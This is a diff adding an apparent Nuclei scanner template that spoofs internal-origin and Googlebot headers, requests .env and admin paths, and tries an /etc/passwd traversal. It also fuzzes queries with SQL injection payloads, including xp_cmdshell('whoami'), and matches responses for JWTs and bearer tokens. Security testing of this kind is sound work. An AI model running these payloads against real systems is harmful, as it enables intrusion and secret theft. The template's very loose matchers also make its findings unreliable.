@@ -1,0 +1,64 @@
+id: advanced-security-bypass
+
+info:
+  name: Ultimate Security Bypass & Token Analysis
+  author: soumen-mridha
+  severity: critical
+  description: Detects WAF bypass techniques, JWT token exposure, Blind SQLi, and LFI vulnerabilities.
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin"
+      - "{{BaseURL}}/api/v1/protected"
+      - "{{BaseURL}}/.env"
+      - "{{BaseURL}}/jwt-token"
+      - "{{BaseURL}}/auth"
+      - "{{BaseURL}}/page.php?id=1"
+      - "{{BaseURL}}/file.php?file=../../../../etc/passwd"
+    
+    headers:
+      X-Originating-IP: "127.0.0.1"
+      X-Forwarded-For: "127.0.0.1"
+      X-Forwarded-Host: "localhost"
+      X-Client-IP: "127.0.0.1"
+      Referer: "http://google.com"
+      User-Agent: "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+
+    payloads:
+      sqli_payloads:
+        - "' OR '1'='1' --"
+        - "' UNION SELECT null,null --"
+        - "' AND 1=1 --"
+        - "'; EXEC xp_cmdshell('whoami') --"
+        
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{sqli_payloads}}"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "JWT"
+          - "eyJhbGciOi"
+          - "Authorization: Bearer"
+          - "token"
+          - "access_token"
+          - "root:x:0:0"
+          - "syntax error"
+
+      - type: regex
+        regex:
+          - "ey[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" # JWT Token regex
+          - "(?i)authorization: Bearer [a-zA-Z0-9\\-._~+\\/]+=*"
+          - "(?i)csrf_token[\"']?\\s*:\\s*[\"'][a-zA-Z0-9_\\-]{32,}"
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
+          - 403
+          - 500
